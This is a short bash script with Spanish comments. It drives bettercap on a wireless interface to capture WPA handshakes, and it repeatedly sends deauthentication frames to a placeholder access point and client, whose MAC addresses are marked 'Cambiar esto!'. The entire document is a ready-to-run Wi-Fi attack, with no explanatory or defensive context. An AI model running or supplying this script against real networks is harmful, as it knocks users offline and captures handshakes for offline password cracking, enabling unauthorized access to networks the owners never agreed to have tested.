#!/bin/bash
AP="DE:AD:BE:EF:DE:AD" # Cambiar esto!
STA="11:22:33:44:55:66" # Cambiar esto!
HAND="/tmp/handshakes/mi_handshake.pcap"

mkdir -p "$(dirname "$HAND")"

sudo bettercap -iface wlan0 -eval "wifi.recon off; set wifi.handshakes.file $HAND; wifi.recon on; set ticker.period 10; set ticker.commands \"wifi.deauth $AP $STA\"; ticker on"